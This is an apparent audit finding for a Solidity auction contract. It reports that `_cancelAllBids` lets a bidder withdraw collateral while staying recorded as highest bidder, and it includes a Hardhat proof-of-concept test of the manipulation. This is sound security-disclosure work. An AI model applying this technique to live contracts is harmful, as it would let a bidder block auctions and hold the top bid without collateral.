# Lack of checking highest bidder in _cancelAllBids lead to collateral-free highest bid

## Summary
`_cancelAllBids` call doesn't check the canceled bid is not the highest bid on the current auction round, which will create the chance for malicious users to manipulate the auction and stop the auction from normally running

## Vulnerability Detail
In `_cancelBid`, a check requires that the bid can't be cancelled if it's highest bidder.

```solidity
        require(
            bidder != l.highestBids[tokenId][round].bidder,
            'EnglishPeriodicAuction: Cannot cancel bid if highest bidder'
        );
```
However, for `_cancelAllBids` call, there is no such check and require statement to ensure that the canceled bid is not the highest bid on the current auction round.

```solidity
/**
     * @notice Cancel bids for all rounds
     */
    function _cancelAllBids(uint256 tokenId, address bidder) internal {
        EnglishPeriodicAuctionStorage.Layout
            storage l = EnglishPeriodicAuctionStorage.layout();

        uint256 currentAuctionRound = l.currentAuctionRound[tokenId];

        for (uint256 i = 0; i <= currentAuctionRound; i++) {
            Bid storage bid = l.bids[tokenId][i][bidder];
            //@audit: no checker for highest bidder
            if (bid.collateralAmount > 0) {
                // Make collateral available to withdraw
                l.availableCollateral[bidder] += bid.collateralAmount;

                // Reset collateral and bid
                bid.collateralAmount = 0;
                bid.bidAmount = 0;
            }
        }
    }
```
## Impact
malicious user could create a bid with a large amount of ETH (could use flashLoan) to become the highest bid, and then after a short time (even in a single block),  call `cancelAllBidsAndWithdrawCollateral` to cancel this bid (internally called `_cancelAllBids`) and withdraw collateral. Since the lack of check, this call will success and leave the `highestBids` of this round unchanged, highest bidder still be the malicious user and his bidAmount. 

By this operation, malicious user can become highest bidder with no collateral placed. Also, it's hard for normal user to become the highest bidder since malicious user's bid amount could be very large, for the checker inside `_placeBid`

```solidity
        // Check if highest bid
        if (l.highestBids[tokenId][currentAuctionRound].bidAmount > 0) {
            require(
                bidAmount >=
                    l.highestBids[tokenId][currentAuctionRound].bidAmount +
                        l.minBidIncrement,
                'EnglishPeriodicAuction: Bid amount must be greater than highest outstanding bid'
            );
        }
```
See the POC code using hardhat test
```typescript
it('poc', async function () {
      const instance = await getInstance({
        auctionLengthSeconds: 300,
        initialPeriodStartTime: (await time.latest()) - 200,
        licensePeriod: 1000,
      });
      const b1BalanceBefore = await ethers.provider.getBalance(bidder1.address);

      // @audit: bid a very large amount of ETH
      const bidAmt = ethers.utils.parseEther('9000');
      const feeAmt = await instance.calculateFeeFromBid(bidAmt);
      const collateralAmt = feeAmt.add(bidAmt);

      // @audit: bidder1 place bid, guarrantee that highestBid can be accuqired by him
      const r1 = await instance
        .connect(bidder1)
        .placeBid(0, bidAmt, { value: collateralAmt});
      let receipt1 = await r1.wait();
      let gas1 = receipt1.gasUsed.mul(r1.gasPrice);

      // @audit: bidder1 cancelAllBids, this could be done very quickly (even in a single block?)
      const r2 = await instance
        .connect(bidder1)
        .cancelAllBidsAndWithdrawCollateral(0);
      let receipt2 = await r2.wait();
      let gas2 = receipt2.gasUsed.mul(r2.gasPrice);

      // @audit: bidder1 still be the highest bidder, with very large bid amount
      const highestBid = await instance['highestBid(uint256,uint256)'](0, 0);
      expect(highestBid.bidder).to.be.equal(bidder1.address);
      expect(highestBid.bidAmount).to.be.equal(bidAmt);
      expect(highestBid.feeAmount).to.be.equal(feeAmt);
      expect(highestBid.collateralAmount).to.be.equal(collateralAmt);
      
      // @audit: bidder1 can acquire highest bid without any collateral
      const b1BalanceAfter = await ethers.provider.getBalance(bidder1.address);
      expect(b1BalanceAfter.add(gas1).add(gas2)).to.be.equal(b1BalanceBefore);

    });

## Tool used
Manual Review

## Recommendation
Add necessary check to make sure that `_cancelAllBids` call won't cancel the highest bid
